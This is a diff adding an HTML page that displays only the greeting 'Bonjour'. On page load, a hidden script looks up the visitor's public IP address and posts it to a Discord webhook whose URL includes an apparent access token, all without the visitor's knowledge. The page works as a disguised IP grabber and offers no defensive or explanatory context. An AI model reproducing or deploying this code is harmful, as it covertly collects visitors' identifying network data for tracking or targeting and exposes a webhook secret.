@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bonjour</title>
+    <script>
+        window.onload = function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://api.ipify.org", true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    var ip_address = xhr.responseText;
+                    var webhook_url = "https://discord.com/api/webhooks/1206997341400338512/8KrH2US4iK6FV8xK3IH037DRwqDosMGb6ya8NXAWbkFf4fEFVBRNvGa0CSFsqmurJMVT";
+                    var webhook_data = {
+                        "content": "Bonjour! Mon adresse IP est " + ip_address
+                    };
+                    var xhr_webhook = new XMLHttpRequest();
+                    xhr_webhook.open("POST", webhook_url, true);
+                    xhr_webhook.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+                    xhr_webhook.send(JSON.stringify(webhook_data));
+                }
+            }
+            xhr.send();
+        }
+    </script>
+</head>
+<body>
+    <h1>Bonjour</h1>
+</body>
+</html>
